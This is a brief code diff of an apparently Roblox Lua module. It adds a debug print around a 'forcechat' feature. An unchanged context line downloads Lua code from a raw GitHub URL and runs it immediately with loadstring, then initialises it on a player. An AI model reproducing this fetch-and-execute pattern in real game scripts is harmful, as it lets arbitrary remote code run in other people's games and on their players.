@@ -42,6 +42,8 @@ function module:init(exec, execute2, main, title, buttons, execute, shadow, clea
                     if not exec.Parent:FindFirstChild("forcechat") then
                         local fcmain = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/fc/u.lua", true))()
 
+                        print(fcmain)
+
 		                fcmain:init(player)
                     end
                 end
